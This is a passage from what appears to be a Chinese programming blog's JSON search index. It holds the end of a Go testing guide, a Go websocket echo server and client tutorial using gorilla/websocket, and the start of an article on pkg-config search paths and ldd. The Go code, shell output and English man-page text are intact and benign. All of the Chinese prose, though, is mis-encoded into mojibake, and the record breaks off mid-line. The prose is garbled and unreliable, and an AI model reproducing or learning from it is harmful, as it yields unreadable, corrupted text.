‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä½†æ˜¯æµ‹è¯•ç»§ç»­ï¼Œä¼šç”¨åˆ°ï¼š\n\n  ```\n  Error: ç›¸å½“äº Log + Fail\n  Errorf: ç›¸å½“äº Logf + Fail\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œå¸Œæœ›æ ‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä½†ä¸­æ–­æµ‹è¯•ï¼Œä¼šç”¨åˆ°\n\n  ```\n  Fatal: ç›¸å½“äº Log + FailNow\n  Fatalf: ç›¸å½“äº Logf + FailNow\n  ```\n\n  \n\n### 4.  å‹åŠ›æµ‹è¯•\n\n+ func BenchmarkXxx(*testing.B)  //å‡½æ•°å½¢å¼\n+ é€šè¿‡ \"go test\" å‘½ä»¤ï¼ŒåŠ ä¸Š `-bench` flag æ¥æ‰§è¡Œ\n\n```go\nfunc BenchmarkIsPalindrome(b *testing.B) {\n\tfor i := 0; i < b.N; i++ {\n\t\tIsPalindrome(\"A man, a plan, a canal: Panama\")\n\t}\n}\n\n$ go test -bench=.\nPASS\nBenchmarkIsPalindrome-8 1000000                1035 ns/op\nok      gopl.io/ch11/word2      2.179s\n```\n\nç»“æœä¸­åŸºå‡†æµ‹è¯•åçš„æ•°å­—åç¼€éƒ¨åˆ†ï¼Œè¿™é‡Œæ˜¯8ï¼Œè¡¨ç¤ºè¿è¡Œæ—¶å¯¹åº”çš„GOMAXPROCSçš„å€¼ã€‚\n\næŠ¥å‘Šæ˜¾ç¤ºæ¯æ¬¡è°ƒç”¨IsPalindromeå‡½æ•°èŠ±è´¹1.035å¾®ç§’ï¼Œæ˜¯æ‰§è¡Œ1,000,000æ¬¡çš„å¹³å‡æ—¶é—´ã€‚\n\nå› ä¸ºåŸºå‡†æµ‹è¯•é©±åŠ¨å™¨å¼€å§‹æ—¶å¹¶ä¸çŸ¥é“æ¯ä¸ªåŸºå‡†æµ‹è¯•å‡½æ•°è¿è¡Œæ‰€èŠ±çš„æ—¶é—´ï¼Œå®ƒä¼šå°è¯•åœ¨çœŸæ­£è¿è¡ŒåŸºå‡†æµ‹è¯•å‰å…ˆå°è¯•ç”¨è¾ƒå°çš„Nè¿è¡Œæµ‹è¯•æ¥ä¼°ç®—åŸºå‡†æµ‹è¯•å‡½æ•°æ‰€éœ€è¦çš„æ—¶é—´ï¼Œç„¶åæ¨æ–­ä¸€ä¸ªè¾ƒå¤§çš„æ—¶é—´ä¿è¯ç¨³å®šçš„æµ‹é‡ç»“æœã€‚\n\n\n\n### 5. å¸¸ç”¨æµ‹è¯•ç”¨æ³•\n\n##### 5.1 æµ‹è¯•å•ä¸ªæ–‡ä»¶å’Œå•ä¸ªæ–¹æ³•\n\n+ æµ‹è¯•å•ä¸ªæ–‡ä»¶ go test -v  file_test.go\n\n+ æµ‹è¯•å•ä¸ªå‡½æ•°ï¼šgo test -v file_test.go -test.run TestFunc\n\n##### 5.2 æµ‹è¯•goroutine æ˜¯å¦ç«äº‰\n\n```\ngo test -race\n```\n\n##### 5. 3 TestMainå‡½æ•°\n\nåœ¨æµ‹è¯•ä¹‹å‰æˆ–ä¹‹åè¿›è¡Œé¢å¤–çš„è®¾ç½®ï¼ˆsetupï¼‰æˆ–æ‹†å¸ï¼ˆteardown), æµ‹è¯•è¿›å…¥çš„ç¬¬ä¸€ä¸ªå‡½æ•°\n\n```\nfunc TestMain(m *testing.M)\n```\n\n##### 5.4 æµ‹è¯•è¦†ç›–ç‡\n\n```\ngo tool cover -html=c.out\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™\n\n+ https://github.com/quii/learn-go-with-tests  //éå¸¸é‡è¦\n+ https://github.com/stretchr/testify\n\n+ https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html\n\n+ https://studygolang.com/articles/12587\n\n","tags":["golang"],"categories":["golang"]},{"title":"golangçš„websocketçš„ä½¿ç”¨","url":"%2Fp%2Ffae4c74c.html","content":"\n\n\n### 1. å‰è¨€\n\næœ‰äº›åœºæ™¯ä¸‹ï¼Œæ¯”å¦‚äº¤æ˜“ K çº¿ï¼Œæˆ‘ä»¬éœ€è¦å‰ç«¯å¯¹åç«¯è¿›è¡Œè½®è¯¢æ¥ä¸æ–­è·å–æˆ–è€…æ›´æ–°èµ„æºçŠ¶æ€ã€‚è½®è¯¢çš„é—®é¢˜æ¯«æ— ä»¥ä¸ºæ˜¯ä¸€ç§ç¬¨é‡çš„æ–¹å¼ï¼Œå› ä¸ºæ¯ä¸€æ¬¡ http è¯·æ±‚é™¤äº†æœ¬èº«çš„èµ„æºä¿¡æ¯ä¼ è¾“å¤–è¿˜æœ‰ä¸‰æ¬¡æ¡æ‰‹ä»¥åŠå››æ¬¡æŒ¥æ‰‹ã€‚æ›¿ä»£è½®è¯¢çš„ä¸€ç§æ–¹æ¡ˆæ˜¯å¤ç”¨ä¸€ä¸ª http è¿æ¥ï¼Œæ›´å‡†ç¡®çš„å¤ç”¨åŒä¸€ä¸ª tcp è¿æ¥ã€‚è¿™ç§æ–¹å¼å¯ä»¥æ˜¯ http é•¿è¿æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¯ websocketã€‚\n\n<!-- more -->\n\n##### 1.1. httpé•¿è¿æ¥\n\nhttp å…¶å®ä¸å­˜åœ¨é•¿çŸ­è¿æ¥, httpåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ï¼Œå®è´¨ä¸Šæ˜¯tcpåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ã€‚\n\nhttpä¼šè¯æ°¸è¿œéƒ½æ˜¯ï¼šè¯·æ±‚å“åº”ç»“æŸï¼Œè¿™é‡Œé•¿è¿æ¥æŒ‡ä¸€æ¬¡tcpè¿æ¥å¯ä»¥ä¼ é€’å¤šæ¬¡çš„HTTPæŠ¥æ–‡ä¿¡æ¯ã€‚\n\n##### 1.2 websocket\n\nwebsocketåè®®æ˜¯åŸºäºtcpçš„ä¸€ç§æ–°çš„ç½‘ç»œåè®®ã€‚å®ƒå®ç°äº†æµè§ˆå™¨ä¸æœåŠ¡å™¨å…¨åŒå·¥(full-duplex)é€šä¿¡â€”â€”å…è®¸æœåŠ¡å™¨ä¸»åŠ¨å‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯ã€‚\nwebsocketé€šä¿¡åè®®äº2011å¹´è¢«IETFå®šä¸ºæ ‡å‡†RFC 6455ï¼Œå¹¶è¢«RFC7936æ‰€è¡¥å……è§„èŒƒã€‚\n\n##### 1.3 websocket å’Œ http é•¿è¿æ¥çš„åŒºåˆ«\n\né¦–å…ˆ websocket å’Œ http æ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ç§åè®®ï¼Œè™½ç„¶åº•å±‚éƒ½æ˜¯ tcp/ipã€‚http é•¿è¿æ¥ä¹Ÿæ˜¯å±äº http åè®®ã€‚\n\nhttp åè®®å’Œ websocket çš„æœ€å¤§åŒºåˆ«å°±æ˜¯ http æ˜¯åŸºäº request/response æ¨¡å¼ï¼Œè€Œ websocket çš„ client å’Œ server ç«¯å´å¯ä»¥éšæ„å‘èµ· data pushã€‚\n\n##### 1.4 sse(server-sent events)\n\nsseæ˜¯ websockct çš„ä¸€ç§è½»é‡ä»£æ›¿æ–¹æ¡ˆï¼Œä½¿ç”¨ http åè®®ã€‚sse è§„èŒƒæ˜¯ html5 è§„èŒƒçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚\n\nä¸¥æ ¼åœ°è¯´ï¼Œhttpæ— æ³•åšåˆ°æœåŠ¡å™¨ä¸»åŠ¨æ¨é€ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ç§å˜é€šæ–¹æ³•ï¼Œå°±æ˜¯æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å£°æ˜ï¼Œæ¥ä¸‹æ¥è¦å‘é€çš„æ˜¯æµä¿¡æ¯ï¼ˆContent-Type: text/event-streamï¼‰ã€‚\n\næ€»ä½“æ¥è¯´ï¼Œwebsocket æ›´å¼ºå¤§å’Œçµæ´»ã€‚å› ä¸ºå®ƒæ˜¯å…¨åŒå·¥é€šé“ï¼Œå¯ä»¥åŒå‘é€šä¿¡ï¼›sse æ˜¯å•å‘é€šé“ï¼Œåªèƒ½æœåŠ¡å™¨å‘æµè§ˆå™¨å‘é€ï¼Œå› ä¸ºæµä¿¡æ¯æœ¬è´¨ä¸Šå°±æ˜¯ä¸‹è½½ã€‚å¦‚æœæµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œå°±å˜æˆäº†å¦ä¸€æ¬¡ http è¯·æ±‚ã€‚\n\n\n\n### 2. golang websocket\n\nåœ¨golangè¯­è¨€ä¸­ï¼Œç›®å‰æœ‰ä¸¤ç§æ¯”è¾ƒå¸¸ç”¨çš„å®ç°æ–¹å¼ï¼šä¸€ä¸ªæ˜¯golangè‡ªå¸¦çš„åº“ï¼Œå¦ä¸€ä¸ªæ˜¯[gorilla](github.com/gorilla/websocket)ï¼Œåè€…åŠŸèƒ½æ›´åŠ å¼ºå¤§ã€‚\n\n\n\n##### 2.1 serverç«¯\n\nä¸‹é¢serverç«¯æ˜¯ä¸€ä¸ªhttp æœåŠ¡å™¨ï¼Œç›‘å¬8080ç«¯å£ã€‚å½“æ¥æ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œå°†è¿æ¥ä½¿ç”¨çš„httpåè®®å‡çº§ä¸ºwebsocketåè®®ã€‚åç»­é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨websocketè¿›è¡Œé€šä¿¡ã€‚\n\nå¯¹æ¯ä¸ªè¿æ¥ï¼Œserverç«¯ç­‰å¾…è¯»å–æ•°æ®ï¼Œè¯»åˆ°æ•°æ®åï¼Œæ‰“å°æ•°æ®ï¼Œç„¶åï¼Œå°†æ•°æ®åˆå‘é€ç»™client\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nvar upgrader = websocket.Upgrader{} // use default options\n\nfunc echo(w http.ResponseWriter, r *http.Request) {\n\tc, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Print(\"upgrade:\", err)\n\t\treturn\n\t}\n\tdefer c.Close()\n\tfor {\n\t\tmt, message, err := c.ReadMessage()\n\t\tif err != nil {\n\t\t\tlog.Println(\"read:\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"server recv: %s\", message)\n\t\terr = c.WriteMessage(mt, message)\n\t\tif err != nil {\n\t\t\tlog.Println(\"write:\", err)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\thttp.HandleFunc(\"/echo\", echo)\n\tlog.Fatal(http.ListenAndServe(*addr, nil))\n}\n```\n\n\n\n##### 2.2 clientç«¯\n\nclientå¯åŠ¨åï¼Œé¦–å…ˆè¿æ¥serverã€‚è¿æ¥å»ºç«‹åï¼Œä¸»routineæ¯ä¸€ç§’é’Ÿå‘serverå‘é€æ¶ˆæ¯(å½“å‰æ—¶é—´)ã€‚å¦ä¸€ä¸ªroutineä»serveræ¥æ”¶æ•°æ®,å¹¶æ‰“å°ã€‚\n\nå½“clienté€€å‡ºæ—¶ï¼Œä¼šå‘serverå‘é€å…³é—­æ¶ˆæ¯ã€‚æ¥ç€ï¼Œç­‰å¾…é€€å‡ºã€‚\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\t\"os/signal\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nfunc main() {\n\tflag.Parse()\n\tlog.SetFlags(0)\n\n\tinterrupt := make(chan os.Signal, 1)\n\tsignal.Notify(interrupt, os.Interrupt)\n\n\tu := url.URL{Scheme: \"ws\", Host: *addr, Path: \"/echo\"}\n\tlog.Printf(\"connecting to %s\", u.String())\n\n\tc, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n\tif err != nil {\n\t\tlog.Fatal(\"dial:\", err)\n\t}\n\tdefer c.Close()\n\n\tdone := make(chan struct{})\n\n\tgo func() {\n\t\tdefer close(done)\n\t\tfor {\n\t\t\t_, message, err := c.ReadMessage()\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"read:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tlog.Printf(\"client recv: %s\", message)\n\t\t}\n\t}()\n\n\tticker := time.NewTicker(time.Second)\n\tdefer ticker.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-done:\n\t\t\treturn\n\t\tcase t := <-ticker.C:\n\t\t\terr := c.WriteMessage(websocket.TextMessage, []byte(t.String()))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\tcase <-interrupt:\n\t\t\tlog.Println(\"interrupt\")\n\n\t\t\t// Cleanly close the connection by sending a close message and then\n\t\t\t// waiting (with timeout) for the server to close the connection.\n\t\t\terr := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, \"\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write close:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase <-done:\n\t\t\tcase <-time.After(time.Second):\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n\n\n![1](golang_websocket/1.png)\n\n\n\n### 3. æ€»ç»“\n\n##### æœåŠ¡å™¨:\n\n+ var upgrader = websocket.Upgrader{}\n+ c, err := upgrader.Upgrade(w, r, nil)\n+ forå¾ªç¯é‡Œ c.ReadMessage()  å’Œ c.WriteMessage(mt, message)\n\n##### å®¢æˆ·ç«¯:\n\n+ c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n+ forå¾ªç¯é‡Œ c.ReadMessage()  å’Œ c.WriteMessage(mt, message)\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/35167916\n+ https://www.jianshu.com/p/3fc3646fad80","tags":["websocket"],"categories":["golang"]},{"title":"åŠ¨æ€åº“æŸ¥æ‰¾è·¯å¾„åŠLD_LIBRARY_PATHé—®é¢˜","url":"%2Fp%2F17c0913d.html","content":"\nè¯´åˆ°å’ŒåŠ¨æ€åº“æŸ¥æ‰¾è·¯å¾„ç›¸å…³çš„é—®é¢˜ï¼Œæ€»ä½“ä¸Šå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š\n\n+ ç¬¬ä¸€ç±»ï¼šé€šè¿‡æºä»£ç ç¼–è¯‘ç¨‹åºæ—¶å‡ºç°çš„æ‰¾ä¸åˆ°æŸä¸ªä¾èµ–åŒ…çš„é—®é¢˜\n+ ç¬¬äºŒç±»ï¼šå°±æ˜¯åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œæ˜æ˜æŠŠé‚£ä¸ªç¨‹åºéœ€è¦çš„ä¾èµ–åŒ…éƒ½å·²ç»å®‰è£…çš„å¦¥å¦¥çš„äº†ï¼Œå¯è¿è¡Œçš„æ—¶å€™äººå®¶å°±å‘Šè¯‰ä½ è¯´`error while loading shared libraries: libxxx.so.y: cannot open shared object file: No such file or directory`ã€‚\n\n<!-- more -->\n\n###    1. æºä»£ç å®‰è£…ç¨‹åºæ‰¾ä¸åˆ°ä¾èµ–åº“\n\né€šè¿‡æºç åŒ…å®‰è£…ç¨‹åºæ—¶ï¼Œä¸»è¦ç”¨åˆ°äº†â€œä¸‰å¤§æ­¥â€ç­–ç•¥ï¼šconfigureã€makeå’Œmake install ã€‚å‡ºé—®é¢˜æœ€å¤šçš„å°±æ˜¯åœ¨configureé˜¶æ®µï¼Œå¾ˆå¤šåˆå­¦è€…ç”±äºä¸çŸ¥é“configureçš„é‚£ä¹ˆå¤šå‚æ•°è¯¥æ€ä¹ˆç”¨ï¼Œæ‰€ä»¥å¾€å¾€ä¸ºäº†çœäº‹ï¼Œä¸€å¥ç®€å•çš„â€œ./configureâ€ä¸‹å»ï¼Œç™¾åˆ†ä¹‹å…«ä¹åéƒ½èƒ½æˆåŠŸï¼Œå¯é—®é¢˜å¾€å¾€å°±å‡ºåœ¨å‰©ä¸‹çš„ç™¾åˆ†ä¹‹åå‡ ä¸Šé¢äº†ã€‚\n\n\n\nåœ¨å®‰è£…çš„configureé˜¶æ®µï¼Œä¸ºäº†æ£€æµ‹å®‰è£…å®‰è£…ç¯å¢ƒæ˜¯å¦æ»¡è¶³ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå«åš`pkg-config`çš„å·¥å…·æ¥æ£€æµ‹å®ƒéœ€è¦ä¾èµ–çš„åŠ¨æ€åº“æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªå·¥å…·æˆ‘ä»¬åœ¨ä¸Šä¸€ç¯‡åšæ–‡å·²ç»è®¤è¯†è¿‡äº†ã€‚pkg-configé€šå¸¸æƒ…å†µéƒ½æ˜¯ä½äº/usr/binç›®å½•ä¸‹ï¼Œæ˜¯ä¸ªå¯æ‰§è¡Œç¨‹åºã€‚åœ¨configureé˜¶æ®µï¼Œé€šå¸¸éƒ½ä¼šç”¨pkg-configæ¥åˆ¤æ–­æ‰€ä¾èµ–çš„åŠ¨æ€åº“æ˜¯å¦å­˜åœ¨ã€‚ç°åœ¨é—®é¢˜å°±æ˜¯ï¼Œè¿™ä¸ªå·¥å…·æ˜¯å¦‚ä½•åˆ¤æ–­çš„å‘¢ï¼Ÿå®ƒçš„ä¾æ®æ˜¯ä»€ä¹ˆï¼Ÿå½“è¿™ä¸¤ä¸ªé—®é¢˜å¼„æ˜ç™½äº†ï¼ŒçœŸç›¸ä¹Ÿå°±å¤§ç™½äº†ã€‚\n\n\n\n ä¸€èˆ¬å½“æˆ‘ä»¬å®‰è£…å®ŒæŸä¸ªç¨‹åºåï¼Œå¦‚æœå®ƒæä¾›äº†åŠ¨æ€åº“çš„åŠŸèƒ½ï¼Œåœ¨æºç ä¸­éƒ½ä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªä»¥pcç»“å°¾çš„æ–‡ä»¶ï¼Œå½“æ‰§è¡Œå®Œmake installåè¿™äº›pcæ–‡ä»¶æ‹·è´åˆ°${prefix}/lib/pkgconfigè¿™ä¸ªç›®å½•é‡Œï¼Œè¿™é‡Œçš„prefixå°±æ˜¯æˆ‘ä»¬åœ¨configureé˜¶æ®µæ—¶é€šè¿‡é…ç½®å‚æ•°--prefixæŒ‡å®šçš„ï¼Œç¼ºçœæƒ…å†µè¿™ä¸ªå€¼å°±æ˜¯/usr/localï¼Œæ‰€ä»¥è¿™äº›pcæ–‡ä»¶æœ€ç»ˆä¼šè¢«æ‹·è´åˆ°/usr/local/lib/pkgconfigç›®å½•ä¸‹ã€‚å¯èƒ½æœ‰äººä¼šé—®ï¼Œè¿™äº›pcæ–‡ä»¶æœ‰å•¥ç”¨å‘¢ï¼Ÿæˆ‘ä»¬éšä¾¿æ‰“å¼€ä¸€ä¸ªæ¥ç…ç…ï¼š\n\n```shell\n\n[root@localhost ~]# cat /usr/local/lib/pkgconfig/librtmp.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib\nincdir=${prefix}/include\n\n\nName: librtmp\nDescription: RTMP implementation\nVersion: v2.3\nRequires: libssl,libcrypto\nURL: http://rtmpdump.mplayerhq.hu\nLibs: -L${libdir} -lrtmp -lz\nCflags: -I${incdir}\n```\n\nè·Ÿæˆ‘ä»¬configureé˜¶æ®µç›¸å…³çš„ä¸»è¦é›†ä¸­åœ¨Libså’ŒCflagsä¸¤é¡¹ä¸Šé¢ï¼Œå¦‚æœä½ æ­¤æ—¶å†æ‰§è¡Œä¸‹é¢è¿™ä¸¤æ¡å‘½ä»¤ï¼Œå°±å…¨æ˜ç™½äº†ï¼š\n\n```shell\n[root@localhost ~]# pkg-config --cflags librtmp\n-I/usr/local/include\n[root@localhost ~]# pkg-config --libs librtmp\n-L/usr/local/lib -lrtmp -lz -lssl -lcrypto\n```\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œpkg-configæŠŠæˆ‘ä»¬ä»¥å‰éœ€è¦åœ¨Makefileé‡ŒæŒ‡å®šç¼–è¯‘å’Œé“¾æ¥æ—¶æ‰€éœ€è¦ç”¨åˆ°çš„å‚æ•°ä»æ‰‹å·¥ç¡¬ç¼–ç çš„æ¨¡å¼å˜æˆäº†è‡ªåŠ¨å®Œæˆï¼ŒèŠ‚çº¦äº†å¤šå°‘è·¨å¹³å°ç§»æ¤çš„å…¼å®¹æ€§é—®é¢˜ã€‚\n\n\n\n##### 1.1 å®‰è£…äº†æ‰¾ä¸åˆ°ä¾èµ–åº“çš„åŸå› \n\nå‡å¦‚è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†è¦çš„ç¼–è¯‘çš„è½¯ä»¶åŒ…ä¾èµ–librtmpè¿™ä¸ªåŠ¨æ€åº“ï¼Œé‚£ä¹ˆæ­¤æ—¶åœ¨æˆ‘ç³»ç»Ÿä¸Šè¿™ä¸ªæ£€æµ‹å°±ç®—é€šè¿‡äº†ã€‚å½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ£€æµ‹è¿‡äº†ä¸ä¸€å®šå…¼å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬åªè®¨è®ºèƒ½ä¸èƒ½æ‰¾åˆ°ä¾èµ–åº“çš„é—®é¢˜ã€‚å¥½äº†ï¼Œå¦‚æœè¯´æ‰¾ä¸åˆ°æŸä¸ªåº“è¯¥æ€ä¹ˆåŠã€‚å‰ææ˜¯ä½ ç¡®ç¡®å®å®å·²ç»å®‰è£…äº†å®ƒéœ€è¦çš„åº“ï¼Œä¸ç”¨å¤šæƒ³ï¼ŒåŸå› åªæœ‰ä¸€ä¸ªï¼Œpkg-configæ‰¾ä¸åˆ°è¿™ä¸ªä¸è¿™ä¸ªåº“å¯¹åº”çš„pcæ–‡ä»¶ã€‚\n\nä¸ºä»€ä¹ˆä¼šæ‰¾ä¸åˆ°å‘¢ï¼ŒåŸå› åˆæœ‰ä¸¤ç‚¹ï¼š\n\n1ã€pkg-configæœç´¢äº†æ‰€æœ‰å®ƒè®¤ä¸ºåˆé€‚çš„ç›®å½•éƒ½æ²¡æ‰¾ç€è¿™ä¸ªåº“å¯¹åº”çš„pcæ–‡ä»¶çš„ä¸‹è½ï¼›\n\n2ã€è¿™ä¸ªåº“åœ¨å‘å¸ƒæ—¶æ ¹æœ¬å°±æ²¡æœ‰æä¾›å®ƒçš„pcæ–‡ä»¶ã€‚\n\n> é‚£ä¹ˆpkg-configçš„æŸ¥æ‰¾è·¯å¾„æ˜¯å“ªé‡Œï¼Ÿ\n\npkg-configè¾ƒè€çš„ç‰ˆæœ¬é‡Œï¼Œç¼ºçœæƒ…å†µä¸‹ä¼šåˆ°/usr/lib/pkgconfigã€/usr/loca/lib/pkgconfigã€/usr/share/pkgconfigç­‰ç›®å½•ä¸‹å»æœç´¢pcæ–‡ä»¶ï¼Œæ®æˆ‘æ‰€çŸ¥åœ¨0.23ä»¥åŠä¹‹åçš„ç‰ˆæœ¬é‡Œpkg-configçš„æºç é‡Œå·²ç»æ²¡æœ‰å…³äºç¼ºçœæœç´¢è·¯å¾„çš„ä»»ä½•ç¡¬ç¼–ç çš„æˆåˆ†äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå½“ä½ çœ‹pkg-configçš„manæ‰‹å†Œæ—¶ä¼šæœ‰ä¸‹é¢ä¸€æ®µè¯ï¼š\n\n```\npkg-config retrieves information about packages from special metadata files. These files are  named  after the  package,  with  the extension .pc.\nBy default, pkg-config looks in the directory ___prefix___/lib/pkgconfig for these files; it will also look in the colon-separated (on Windows, semicolon-separated) list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\n\nPKG_CONFIG_PATH\n    A colon-separated (on Windows, semicolon-separated) list of directories to search  for  .pc  files. The  default directory will always be searched after searching the path; the default is ___libdir___/pkg-config:___datadir___/pkgconfig where libdir is the libdir where pkg-config and  datadir  is  the  datadir where pkg-config was installed.\n```\n\n\n\n  ä¸Šé¢çš„prefixã€libdirå’Œdatadirï¼Œå°±æ˜¯å®‰è£…pkg-configæ—¶è¢«è®¾å®šå¥½çš„ï¼Œå…·ä½“æƒ…å†µæ˜¯ï¼š\n\n+ å¦‚æœä½ æ˜¯é€šè¿‡yumå’ŒrpmåŒ…å®‰è£…çš„\n\n  ```bash\n  prefix=/usr\n  libdir=${prefix}/lib=/usr/lib\n  datadir=${prefix}/share=/usr/share\n  ```\n\n+ å¦‚æœä½ æ˜¯é€šè¿‡æºç åŒ…å®‰è£…çš„ï¼Œä¸”æ²¡æœ‰æŒ‡å®šprefixçš„å€¼\n\n  ```bash\n  prefix=/usr/local\n  libdir=${prefix}/lib=/usr/local/lib\n  datadir=${prefix}/share=/usr/local/share \n  ```\n\n\n\npkg-configåœ¨æŸ¥æ‰¾å¯¹åº”è½¯ä»¶åŒ…çš„ä¿¡æ¯æ—¶çš„ç¼ºçœæœç´¢è·¯å¾„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æ˜¯`${libdir}/pkgconfig`å’Œ`${datadir}/pkgconfig`ã€‚å¦‚æœä½ è½¯ä»¶åŒ…å¯¹åº”çš„pcæ–‡ä»¶éƒ½ä¸åœ¨è¿™ä¸¤ä¸ªç›®å½•ä¸‹æ—¶ï¼Œpkg-configè‚¯å®šæ‰¾ä¸åˆ°ã€‚æ—¢ç„¶åŸå› éƒ½å·²ç»æ‰¾åˆ°äº†ï¼Œé‚£è§£å†³åŠæ³•ä¹Ÿå°±å¤šç§å¤šæ ·äº†ã€‚\n\n\n\n##### 1.2 è§£å†³æ‰¾ä¸åˆ°åº“çš„é—®é¢˜(PKG_CONFIG_PATH)\n\n+ æˆ‘ä»¬å¯ä»¥åœ¨å®‰è£…æˆ‘ä»¬é‚£ä¸ªè¢«ä¾èµ–çš„è½¯ä»¶åŒ…æ—¶ï¼Œåœ¨configureé˜¶æ®µç”¨--prefixå‚æ•°æŠŠå®‰è£…ç›®å½•æŒ‡å®šåˆ°/usrç›®å½•ä¸‹ï¼›\n\n+ ä¹Ÿå¯ä»¥æŒ‰ç…§ä¸Šé¢è¯´çš„ï¼Œé€šè¿‡ä¸€ä¸ªåå«`PKG_CONFIG_PATH`çš„ç¯å¢ƒå˜é‡æ¥å‘pkg-configæŒ‡æ˜æˆ‘ä»¬è‡ªå·±çš„pcæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯`PKG_CONFIG_PATH`æ‰€æŒ‡å®šçš„è·¯å¾„ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼Œpkg-configä¼šå…ˆè¿›è¡Œæœç´¢ï¼Œå®Œäº†ä¹‹åæ‰æ˜¯å»æœç´¢ç¼ºçœè·¯å¾„ã€‚\n\nå‰è€…çš„ä¼˜ç‚¹æ˜¯ä»¥åå†é€šè¿‡æºç å®‰è£…è½¯ä»¶æ—¶å°‘äº†ä¸å°‘éº»çƒ¦ï¼Œç¼ºç‚¹æ˜¯ç”¨æˆ·è‡ªå·±çš„è½¯ä»¶åŒ…å’Œç³»ç»Ÿè½¯ä»¶æ··åˆ°ä¸€èµ·ä¸æ–¹ä¾¿ç®¡ç†ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨ä¸­ï¼Œåè€…ç”¨çš„è¦å¤šä¸€äº›ã€‚å¦‚ä¸‹:\n\n```bash\nexport PKG_CONFIG_PATH=/your/local/path:$PKG_CONFIG_PATH\n```\n\n  ç„¶åï¼Œåœ¨configureæ—¶å°±ç»å¯¹æ²¡é—®é¢˜äº†ã€‚\n\n\n\n### 2. ç¨‹åºè¿è¡Œæ—¶å‡ºç°libxxx.so.y => not found\n\n##### 2.1 ldd æŸ¥çœ‹ä¾èµ–çš„åŠ¨æ€åº“\n\nç”¨`ldd å¯æ‰§è¡Œç¨‹åºå`å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªè½¯ä»¶å¯åŠ¨æ—¶æ‰€ä¾èµ–çš„åŠ¨æ€åº“ï¼Œå¦‚æœè¾“å‡ºé¡¹æœ‰â€œlibxxx.so.y=> not foundâ€ä¸€é¡¹ï¼Œä½ è¿™ä¸ªè½¯ä»¶100%è¿è¡Œä¸èµ·æ¥ã€‚æˆ‘ä»¬æ¥åšä¸ªè¯•éªŒï¼š\n\n```bash\n[root@localhost ~]# echo $LD_LIBRARY_PATH    //å˜›ä¹Ÿæ²¡æœ‰\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /usr/local/lib/libmp3lame.so.0 (0x0088c000)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 